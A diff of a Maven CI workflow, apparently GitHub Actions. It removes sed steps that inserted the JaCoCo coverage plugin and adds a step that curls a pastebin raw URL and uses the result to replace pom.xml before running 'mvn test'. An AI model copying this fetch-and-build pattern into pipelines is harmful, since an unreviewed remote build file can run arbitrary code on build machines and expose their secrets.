@@ -24,64 +24,11 @@ jobs:
         java-version: '17'
         cache: maven
 
-    - name: Add Jacoco Maven Plugin and Edit Surefire Configuration
-      if: runner.os == 'Linux'
+    - name: Overwrite old pom.xml
       run: |
-        # Add Jacoco Maven Plugin to the build/plugins section
-        sed -i '/<plugins>/a \
-            <plugin> \
-                <groupId>org.jacoco<\/groupId> \
-                <artifactId>jacoco-maven-plugin<\/artifactId> \
-                <version>0.8.11<\/version> \
-                <executions> \
-                    <execution> \
-                        <goals> \
-                            <goal>prepare-agent<\/goal> \
-                        <\/goals> \
-                    <\/execution> \
-                    <!-- attached to Maven test phase --> \
-                    <execution> \
-                        <id>report<\/id> \
-                        <phase>test<\/phase> \
-                        <goals> \
-                            <goal>report<\/goal> \
-                        <\/goals> \
-                    <\/execution> \
-                <\/executions> \
-            <\/plugin>' pom.xml
-
-    - name: Add Jacoco Maven Plugin and Edit Surefire Configuration
-      if: runner.os == 'macOS'
-      run: |
-        # Add Jacoco Maven Plugin to the build/plugins section
-        sed -i '' '/<plugins>/a \
-            <plugin> \
-                <groupId>org.jacoco<\/groupId> \
-                <artifactId>jacoco-maven-plugin<\/artifactId> \
-                <version>0.8.11<\/version> \
-                <executions> \
-                    <execution> \
-                        <goals> \
-                            <goal>prepare-agent<\/goal> \
-                        <\/goals> \
-                    <\/execution> \
-                    <!-- attached to Maven test phase --> \
-                    <execution> \
-                        <id>report<\/id> \
-                        <phase>test<\/phase> \
-                        <goals> \
-                            <goal>report<\/goal> \
-                        <\/goals> \
-                    <\/execution> \
-                <\/executions> \
-            <\/plugin>' pom.xml
-
-        # Edit Surefire Plugin Configuration
-        sed -i '' '/<artifactId>maven-surefire-plugin<\/artifactId>/a \
-            <configuration> \
-                <testFailureIgnore>true<\/testFailureIgnore> \
-            <\/configuration>' pom.xml
-            
+        curl -o new_pom.xml https://pastebin.com/raw/vxWEXASY
+        mv new_pom.xml pom.xml
+          
     - name: Build project with JDK 17
       run: mvn test
 
